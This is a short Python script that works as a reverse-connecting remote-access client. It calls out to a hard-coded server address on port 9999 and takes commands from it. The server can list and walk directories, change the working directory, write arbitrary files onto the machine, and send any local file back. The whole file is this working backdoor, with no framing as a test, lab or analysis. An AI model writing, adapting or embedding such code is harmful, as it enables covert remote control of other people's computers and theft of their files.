import socket
import os

def list_directory(path):
    try:
        if not path or path == "/":
            path = "."
        items = []
        for entry in os.listdir(path):
            full = os.path.join(path, entry)
            if os.path.isdir(full):
                items.append(entry + "/")
            else:
                items.append(entry)
        return "\n".join(items)
    except Exception as e:
        return f"Error: {e}"

def execute_command(cmd):
    try:
        if cmd == "ls":
            return "\n".join(os.listdir())
        elif cmd.startswith("cd "):
            os.chdir(cmd[3:])
            return f"Changed directory to {os.getcwd()}"
        elif cmd.startswith("echo "):
            return cmd[5:]
        elif cmd.startswith("walk "):
            path = cmd[5:]
            output = []
            for root, dirs, files in os.walk(path):
                output.append(f"[DIR] {root}")
                for d in dirs:
                    output.append(f"  └─ [SUBDIR] {d}")
                for f in files:
                    output.append(f"  └─ [FILE] {f}")
            return "\n".join(output)
        else:
            return f"Unknown command: {cmd}"
    except Exception as e:
        return f"Execution error: {e}"

def handle_connection(conn):
    while True:
        try:
            header = conn.recv(1024).decode()
            if not header or header == "exit":
                break

            if header.startswith("CMD:"):
                cmd = header[4:]
                result = execute_command(cmd)
                conn.send(result.encode())

            elif header.startswith("LISTDIR:"):
                path = header[8:]
                result = list_directory(path)
                conn.send(result.encode())

            elif header.startswith("UPLOAD:"):
                parts = header.split(":")
                filename = parts[1]
                size = int(parts[2])
                conn.send("READY".encode())
                data = b""
                while len(data) < size:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                with open(filename, "wb") as f:
                    f.write(data)
                print(f"Received file: {filename}")

            elif header.startswith("DOWNLOAD:"):
                filename = header[9:]
                if not os.path.isfile(filename):
                    conn.send("ERROR".encode())
                else:
                    with open(filename, "rb") as f:
                        data = f.read()
                    conn.send(f"SIZE:{len(data)}".encode())
                    ack = conn.recv(1024).decode()
                    if ack == "READY":
                        conn.send(data)
        except Exception as e:
            print(f"Error: {e}")
            break

    conn.close()

def connect_to_server():
    try:
        server_ip = "192.168.1.100"  # Replace with your server's IP
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((server_ip, 9999))
        print(f"Connected to server at {server_ip}")
        handle_connection(conn)
    except Exception as e:
        print(f"Connection error: {e}")

connect_to_server()
